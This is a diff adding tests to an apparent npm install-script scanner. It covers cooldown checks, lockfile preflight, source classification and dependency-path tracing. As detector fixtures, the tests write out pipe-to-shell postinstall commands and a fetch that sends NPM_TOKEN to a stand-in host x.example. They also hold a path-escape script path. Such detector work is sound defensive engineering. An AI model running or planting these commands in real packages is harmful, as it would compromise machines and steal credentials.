@@ -218,3 +218,141 @@ test("readAnyLock picks up a pnpm project and errors clearly when none exists", 
   assert.equal(found.lockfile, "pnpm-lock.yaml");
   assert.deepEqual(found.deps, [{ name: "left-pad", version: "1.3.0", dev: false }]);
 });
+
+// ---------------------------------------------------------------------------
+// v0.3.0: preflight, deep source inspection, dependency paths
+// ---------------------------------------------------------------------------
+
+import { referencedScriptFile, classifySource, inspectFinding } from "../src/inspect.js";
+import { preflight } from "../src/preflight.js";
+import { buildGraph, pathsTo, blameDirect } from "../src/graph.js";
+import { createRegistry } from "../src/registry.js";
+
+/**
+ * Fake registry that behaves like npmjs.org in the way that actually bit us:
+ * the abbreviated document (install-v1 accept header) carries hasInstallScript
+ * but NO `time` map; only the full packument has timestamps.
+ */
+function fakeNpm({ times = {}, hasInstallScript = {}, scripts = {} } = {}) {
+  const calls = [];
+  const fetchImpl = async (url, init) => {
+    calls.push({ url, accept: init?.headers?.accept ?? null });
+    const rest = decodeURIComponent(url.replace("https://registry.npmjs.org/", ""));
+    const [name, version] = rest.includes("/") && !rest.startsWith("@") ? rest.split("/") : [rest, null];
+    if (version) return { ok: true, json: async () => ({ name, version, scripts: scripts[`${name}@${version}`] ?? {} }) };
+    const versions = Object.fromEntries(
+      Object.keys(times[name] ?? {}).map((v) => [v, { version: v, hasInstallScript: !!hasInstallScript[`${name}@${v}`] }]),
+    );
+    if (init?.headers?.accept === "application/vnd.npm.install-v1+json") {
+      return { ok: true, json: async () => ({ name, versions }) }; // deliberately no `time`
+    }
+    return { ok: true, json: async () => ({ name, versions, time: times[name] ?? {} }) };
+  };
+  return { fetchImpl, calls };
+}
+
+test("cooldown reads publish times from the full packument, not the abbreviated one", async () => {
+  const now = new Date("2026-09-05T12:00:00Z");
+  const { fetchImpl, calls } = fakeNpm({
+    times: { fresh: { "1.0.0": "2026-09-05T06:00:00Z" }, old: { "2.0.0": "2024-01-01T00:00:00Z" } },
+  });
+  const flagged = await checkCooldown(
+    [{ name: "fresh", version: "1.0.0" }, { name: "old", version: "2.0.0" }],
+    { days: 7, now, fetchImpl },
+  );
+  assert.equal(flagged.length, 1, "a version published 6h ago must be flagged");
+  assert.equal(flagged[0].name, "fresh");
+  assert.equal(flagged[0].ageHours, 6);
+  assert.equal(flagged.resolved, 2);
+  // Regression guard: asking for the abbreviated doc returns no timestamps at all,
+  // which silently made every project look clean.
+  assert.ok(calls.every((c) => c.accept === null), "publish-time lookups must not use the abbreviated packument");
+});
+
+test("preflight finds install scripts from a lockfile with no node_modules present", async () => {
+  const { fetchImpl, calls } = fakeNpm({
+    times: { lodash: { "4.17.21": "2021-01-01T00:00:00Z" }, evil: { "1.0.0": "2026-09-01T00:00:00Z" } },
+    hasInstallScript: { "evil@1.0.0": true },
+    scripts: { "evil@1.0.0": { postinstall: "curl https://x.example/a.sh | sh" } },
+  });
+  const result = await preflight(
+    [{ name: "lodash", version: "4.17.21" }, { name: "evil", version: "1.0.0" }],
+    { registry: createRegistry({ fetchImpl }) },
+  );
+  assert.equal(result.checked, 2);
+  assert.equal(result.findings.length, 1);
+  assert.equal(result.findings[0].name, "evil");
+  assert.equal(result.findings[0].risk, "high");
+  assert.equal(result.findings[0].scripts[0].category, "pipe-to-shell");
+  // The cheap abbreviated doc must do the filtering: only the flagged package
+  // is worth a second, heavier request.
+  assert.equal(calls.filter((c) => c.url.endsWith("/1.0.0") || c.url.endsWith("/4.17.21")).length, 1);
+});
+
+test("referencedScriptFile extracts the file a hook hands to node", () => {
+  assert.equal(referencedScriptFile("node install.js"), "install.js");
+  assert.equal(referencedScriptFile("node ./scripts/postinstall.cjs --force"), "scripts/postinstall.cjs");
+  assert.equal(referencedScriptFile("node-gyp rebuild"), null);
+  assert.equal(referencedScriptFile("node /etc/evil.js"), null, "absolute paths are not resolved");
+});
+
+test("classifySource reads the payload behind an innocent-looking command", () => {
+  const clean = classifySource("const fs = require('fs');\nfs.writeFileSync('a', 'b');\n");
+  assert.equal(clean.risk, "medium");
+  assert.equal(clean.evidence.length, 0);
+
+  const nasty = classifySource([
+    "// build helper",
+    "const cp = require('child_process');",
+    "fetch('https://x.example/?t=' + process.env.NPM_TOKEN);",
+  ].join("\n"));
+  assert.equal(nasty.risk, "high");
+  assert.ok(nasty.evidence.some((e) => e.category === "credential-exfil"));
+  assert.ok(nasty.evidence.every((e) => e.line > 0));
+
+  // A packed one-liner in an install script is itself the signal.
+  assert.equal(classifySource(`x(${"'a',".repeat(600)})`).risk, "high");
+});
+
+test("inspectFinding upgrades risk from the file contents and refuses path escapes", async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), "installguard-deep-"));
+  const pkgDir = path.join(dir, "node_modules", "innocent");
+  await mkdir(pkgDir, { recursive: true });
+  await writeFile(path.join(pkgDir, "package.json"), JSON.stringify({ name: "innocent", version: "1.0.0", scripts: { postinstall: "node setup.js" } }));
+  await writeFile(path.join(pkgDir, "setup.js"), "require('child_process').exec('curl https://x.example | sh');\n");
+
+  const findings = await scanTree(dir);
+  assert.equal(findings[0].risk, "medium", "the command string alone looks ordinary");
+
+  const deep = await inspectFinding(dir, findings[0]);
+  assert.equal(deep.risk, "high");
+  assert.equal(deep.scripts[0].sourceFile, "setup.js");
+  assert.ok(deep.scripts[0].evidence.length > 0);
+
+  const escaped = await inspectFinding(dir, {
+    ...findings[0],
+    scripts: [{ hook: "postinstall", command: "node ../../../evil.js", category: "script-exec", risk: "medium" }],
+  });
+  assert.equal(escaped.scripts[0].category, "path-escape");
+  assert.equal(escaped.risk, "high");
+});
+
+test("why traces a transitive package back to the direct dependency that pulled it in", async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), "installguard-graph-"));
+  await writeFile(path.join(dir, "package-lock.json"), JSON.stringify({
+    name: "app",
+    packages: {
+      "": { name: "app", dependencies: { bundler: "^1.0.0" }, devDependencies: { linter: "^2.0.0" } },
+      "node_modules/bundler": { version: "1.0.0", dependencies: { helper: "^3.0.0" } },
+      "node_modules/linter": { version: "2.0.0" },
+      "node_modules/helper": { version: "3.0.0", dependencies: { sneaky: "^4.0.0" } },
+      "node_modules/sneaky": { version: "4.0.0" },
+    },
+  }));
+  const graph = await buildGraph(dir);
+  const paths = pathsTo(graph, "sneaky");
+  assert.deepEqual(paths[0], ["app", "bundler", "helper", "sneaky"]);
+  assert.deepEqual(blameDirect(paths), ["bundler"]);
+  assert.equal(graph.versions.get("sneaky"), "4.0.0");
+  assert.deepEqual(pathsTo(graph, "nonexistent"), []);
+});
